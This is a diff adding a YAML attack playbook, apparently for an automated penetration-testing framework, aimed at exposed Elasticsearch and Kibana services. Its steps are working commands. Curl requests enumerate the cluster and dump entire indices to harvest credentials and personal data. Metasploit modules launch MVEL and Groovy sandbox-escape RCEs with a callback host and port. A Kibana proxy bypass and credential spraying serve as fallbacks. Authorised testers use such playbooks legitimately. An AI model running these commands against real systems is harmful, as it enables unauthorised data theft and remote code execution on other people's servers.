@@ -1,0 +1,40 @@
+id: service_elasticsearch_unauth
+title: "Elasticsearch / Kibana — unauth enum + index dump + groovy RCE"
+phase: exploit
+mitre: ["T1190", "T1530"]
+trigger:
+  services: ["elasticsearch", "kibana"]
+  ports:    [9200, 9300, 5601]
+  cves:     ["CVE-2014-3120", "CVE-2015-1427", "CVE-2015-3337", "CVE-2019-7609"]
+keywords: ["elasticsearch", "kibana", "elastic stack", "lucene", "groovy sandbox", "es rce"]
+preconditions:
+  - "TCP/9200 (ES) or 5601 (Kibana) reachable"
+steps:
+  - tool: curl
+    cmd:  "curl -s http://{target}:9200/"
+    why:  "Banner + cluster_name + version (key for CVE selection)"
+  - tool: curl
+    cmd:  "curl -s http://{target}:9200/_cluster/health?pretty; curl -s http://{target}:9200/_cat/indices?v"
+    why:  "Cluster status + every index — typical unauth exposure leaks ALL data"
+  - tool: curl
+    cmd:  "curl -s 'http://{target}:9200/{index}/_search?pretty&size=10000'"
+    why:  "Full index dump — credentials, PII, internal logs"
+  - tool: nuclei
+    cmd:  "nuclei -t http/exposures/configs/elasticsearch-unauth.yaml -t http/cves/2019/CVE-2019-7609.yaml -u http://{target}:9200/"
+    why:  "Confirm unauth + Kibana RCE (CVE-2019-7609)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/elasticsearch/script_mvel_rce; set RHOSTS {target}; set RPORT 9200; set LHOST {LHOST}; set LPORT {LPORT}; run'"
+    why:  "MVEL sandbox escape (ES <1.2) — CVE-2014-3120"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/elasticsearch/search_groovy_script; set RHOSTS {target}; set RPORT 9200; set LHOST {LHOST}; run'"
+    why:  "Groovy sandbox escape (ES 1.3.x-1.4.x) — CVE-2015-1427"
+  - tool: curl
+    cmd:  "curl -s 'http://{target}:5601/api/console/proxy?path=_search&method=GET' -H 'kbn-xsrf:1'"
+    why:  "Kibana console-proxy bypass — when ES is firewalled but Kibana isn't"
+expected_outcome: "Full index dump → creds/data; RCE as elasticsearch user on vulnerable versions"
+fallbacks:
+  - "X-Pack security enabled → cred required; spray with crackmapexec"
+  - "Kibana CVE-2019-7609 → JS prototype-pollution to RCE via timelion"
+  - "Logstash on same host → exposed inputs (TCP/UDP/HTTP) often unauth"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch"
